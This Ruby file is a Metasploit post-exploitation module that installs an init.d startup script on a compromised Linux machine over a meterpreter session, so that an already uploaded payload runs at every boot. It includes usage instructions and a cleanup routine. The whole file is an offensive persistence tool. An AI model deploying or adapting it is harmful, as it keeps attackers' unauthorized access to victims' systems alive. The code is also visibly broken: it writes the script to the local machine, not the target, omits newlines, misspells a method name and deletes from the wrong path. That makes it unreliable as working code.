##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : Kali_initd_persistence.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Tested on      : Linux Kali 2.0
#
#
# [ DESCRIPTION ]
# Builds 'persistance' init.d startup script that allow users to
# persiste your binary (executable) on Linux distros at every startup.
# HINT: This post-module accepts any 'linux' chmoded payloads (sh|py|rb|etc..)
# HINT: This post-module requires the payload allready deployed on target system.
# HINT: In Kali distos we are 'root' by default, so this post module does
# not required privilege escalation in systems were we are allready root ..
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on           => set SESSION 3
# The full remote path of binary to execute (remote) => set REMOTE_PATH /root/payload
# The full remote path of init.d directory  (remote) => set INIT_PATH /etc/init.d
# Delete persistence script/configurations  (remote) => set DEL_PERSISTENCE true
# Auto-Locate init.d directory full path?   (remote) => set AUTO_LOCATE true
# HINT: 'AUTO_LOCATE true' will overwrite 'INIT_PATH' variable declarations
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/linux/manage/kali_initd_persistence.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/linux/manage/kali_initd_persistence.rb
# Manually Path Search: root@kali:~# locate modules/post/linux/manage
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/linux/manage/kali_initd_persistence
# msf post(kali_initd_persistence) > info
# msf post(kali_initd_persistence) > show options
# msf post(kali_initd_persistence) > show advanced options
# msf post(kali_initd_persistence) > set [option(s)]
# msf post(kali_initd_persistence) > exploit
#
#
# [ HINT ]
# In some linux distributions postgresql needs to be started and
# metasploit database deleted/rebuild to be abble to load module.
# 1 - service postgresql start
# 2 - msfdb reinit   (optional)
# 3 - msfconsole -x 'reload_all'
##




#
# Module Dependencies/requires
#
require 'rex'
require 'msf/core'
require 'msf/core/post/common'



#
# Metasploit Class name and includes
#
class MetasploitModule < Msf::Post
      Rank = GreatRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System



#
# Building Metasploit/Armitage info GUI/CLI
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'Linux Kali init.d persistence post-module',
                        'Description'   => %q{
                                        Builds 'persistance' init.d startup script that allow users to persiste your binary (executable) on Linux distros at every startup. This post-module requires the payload allready deployed on target system and accepts any 'linux' chmoded payloads (sh|py|rb|etc) to be auto-executed at startup.
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                ],
 
                        'Version'        => '$Revision: 1.3',
                        'DisclosureDate' => 'jun 1 2017',
                        'Platform'       => 'linux',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',   # thats no need for privilege escalation (in-kali) ..
                        'Targets'        =>
                                [
                                         [ 'Linux' ]
                                ],
                        'DefaultTarget'  => '1', # default its to run againts Kali 2.0
                        'References'     =>
                                [
                                         [ 'URL', 'http://goo.gl/ny69NS' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                         [ 'URL', 'https://unix.stackexchange.com/questions/326921/run-two-scripts-with-init-d' ]


                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1',             # Default its to run againts session 1
                                         'INIT_PATH' => '/etc/init.d', # Default init.d directory full path
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('REMOTE_PATH', [ false, 'The full remote path of binary to execute (eg /root/payload)'])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('LOCATE_INIT', [ false, 'Auto-Locate init.d directory full path?' , false]),
                                OptString.new('INIT_PATH', [ false, 'The full remote path of init.d directory (eg /etc/init.d)']),
                                OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence script/configurations?' , false])
                        ], self.class) 

        end



#
# Build remote init.d persistence script ..
#
def ls_persisting

  session = client
  rem = session.sys.config.sysinfo
  remote_path = datastore['REMOTE_PATH']     # /root/payload
  init = datastore['INIT_PATH']              # /etc/init.d
  find = datastore['LOCATE_INIT']            # false
  #
  # Auto-Locate init.d directory? (true|false)
  #
  if find == 'true'
    auto = cmd_exe("locate init.d | grep -m 1 '.d'")
    vprint_warning("Auto-Locate: #{auto}")
    initd_path = "#{auto}"
  else
    initd_path = "#{init}"
  end
  script_check = "#{initd_path}/persistance" # /etc/init.d/persistance
  #
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['REMOTE_PATH'] == 'nil'
    vprint_error("Options not configurated correctly ..")
    vprint_warning("Please set REMOTE_PATH option!")
    return nil
  else
    vprint_status("Persist #{remote_path} agent ..")
    Rex::sleep(1.0)
  end


    #
    # Check if persistence its allready active ..
    #
    if session.fs.file.exist?(script_check)
      vprint_error("%red" + "init.d: #{script_check} found ..")
      vprint_error("Post-module reports that persistence its allready active ..")
      vprint_error("Please use DEL_PERSISTENCE option before running this funtion ..")
      return nil
    end
    #
    # Check if agent its deployed (remote) ..
    #
    if not session.fs.file.exist?(remote_path)
      vprint_error("%red" + "agent: #{remote_path} not found ..")
      vprint_error("Please upload your agent before running this funtion ..")
      return nil
    end
    vprint_status("Remote agent full path found ..")
    #
    # Check init.d directory existance (remote)..
    #
    if not session.fs.directory.exist?(initd_path)
      vprint_error("%red" + "path: #{initd_path} not found ..")
      vprint_error("Please set a diferent path in 'INIT_PATH' option ..")
      vprint_error("OR activate 'AUTO_LOCATE true' to auto-locate directory ..")
      return nil
    end
    vprint_status("Remote service directory found ..")

      #
      # This is the init.d script that provides persistence on startup ..
      #
      vprint_warning("Writing init.d persistence startup script ..")
      Rex::sleep(1.0)
      File.open("#{script_check}", "w+") do |f|
        f.write("#!/bin/sh")
        f.write("### BEGIN INIT INFO")
        f.write("# Provides:          persistence on kali")
        f.write("# Required-Start:    $network $local_fs $remote_fs")
        f.write("# Required-Stop:     $remote_fs $local_fs")
        f.write("# Default-Start:     2 3 4 5")
        f.write("# Default-Stop:      0 1 6")
        f.write("# Short-Description: Persiste your binary (elf) in kali linux.")
        f.write("# Description:       Allows users to persiste your binary (elf) in kali linux systems")
        f.write("### END INIT INFO")
        f.write("#")
        f.write("# Give a little time to execute elf agent")
        f.write("sleep 5 > /dev/null")
        f.write("./#{remote_path}")
        f.close
      end
      vprint_good("Service path: #{script_check}")
      Rex::sleep(1.0)

      #
      # Config init.d startup service (chmod + update-rc.d)
      #
      if session.fs.file.exist?(script_check)
        vprint_good("Config init.d persistence script ..")
        Rex::sleep(1.0)
        cmd_exec("chmod +x #{script_check}")
        vprint_good("Update init.d service status (symlinks) ..")
        Rex::sleep(1.0)
        cmd_exec("update-rc.d persistance defaults # 97 03")
      else
        vprint_error("%red" + "init.d script: #{script_check} not found ..")
        vprint_error("Persistence not achieved ..")
        return nil
      end

    #
    # Final displays to user ..
    #
    vprint_status("Persistence achieved on: #{rem['Computer']}")
    Rex::sleep(1.0)
    vprint_line("")

  #
  # error exception funtion
  #
  rescue ::Exception => e
  vprint_error("Error: #{e.class} #{e}")
end





#
# Delete init.d script and confs ..
#
def ls_cleanning

  session = client
  rem = session.sys.config.sysinfo
  init = datastore['INIT_PATH']        # /etc/init.d
  find = datastore['LOCATE_INIT']      # false
  #
  # Auto-Locate init.d directory? (true|false)
  #
  if find == 'true'
    auto = cmd_exe("locate init.d | grep -m 1 '.d'")
    vprint_warning("Auto-Locate: #{auto}")
    initd_path = "#{auto}"
  else
    initd_path = "#{init}"
  end
  script_check = "#{initd_path}/persistance" # /etc/init.d/persistance
  #
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['DEL_PERSISTENCE'] == 'nil'
    vprint_error("Options not configurated correctly ..")
    vprint_warning("Please set DEL_PERSISTENCE option!")
    return nil
  else
    vprint_status("Delete init.d persistence script ..")
    Rex::sleep(1.0)
  end

    #
    # Check init.d persiste script existance ..
    #
    if not session.fs.file.exist?(script_check)
      vprint_error("%red" + "script: #{script_check} not found ..")
      return nil
    end
    vprint_status("Persistence script full path found ..")

      #
      # Delete init.d script ..
      #
      vprint_good("Remove script from init.d directory ..")
      Rex::sleep(1.0)
      cmd_exec("rm -f #{init}/persistance")
      vprint_good("Delete persistence service (symlinks) ..")
      cmd_exec("update-rc.d persistance remove")
      Rex::sleep(1.5)

    #
    # Check init.d persiste script existance (after delete) ..
    #
    if session.fs.file.exist?(script_check)
      vprint_error("%red" + "script: #{script_check} not proper deleted ..")
      vprint_error("Please manually delete : rm -f #{init}/persistance")
      vprint_error("Please manually execute: update-rc.d persistance remove")
      return nil
    end

    #
    # Final displays to user ..
    #
    vprint_status("Persistence deleted from: #{rem['Computer']}")
    vprint_warning("This module will NOT delete the binary from target ..")
    Rex::sleep(1.0)
    vprint_line("")

  #
  # error exception funtion
  #
  rescue ::Exception => e
  vprint_error("Error: #{e.class} #{e}")
end





# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
# ------------------------------------------------
def run
  session = client

      # Variable declarations (msf API calls)
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd

    # Print banner and scan results on screen
    print_line("    +---------------------------------------------+")
    print_line("    |  Kali Linux init.d persistence post-module  |")
    print_line("    |            Author : r00t-3xp10it            |")
    print_line("    +---------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper operative system (Linux)
    if not session.platform == 'linux'
      vprint_error("%red" + "[ ABORT ]: This module only works againt Linux systems")
      return nil
    end
    #
    # Check if we are running in an higth integrity context ..
    #
    if not is_root?
      vprint_error("%red" + "[ ABORT ]: Root access is required ..")
      return nil
    end
    #
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals that we are not on a meterpreter session!
    #
    if not sysinfo.nil?
      vprint_status("Running module against: #{sysnfo['Computer']}")
    else
      vprint_error("%red" + "[ ABORT ]: This module only works in meterpreter sessions!")
      return nil
    end


#
# Selected settings to run
#
      if datastore['REMOTE_PATH']
         ls_persisting
      end

      if datastore['DEL_PERSISTENCE']
         ls_cleanning
      end
   end
end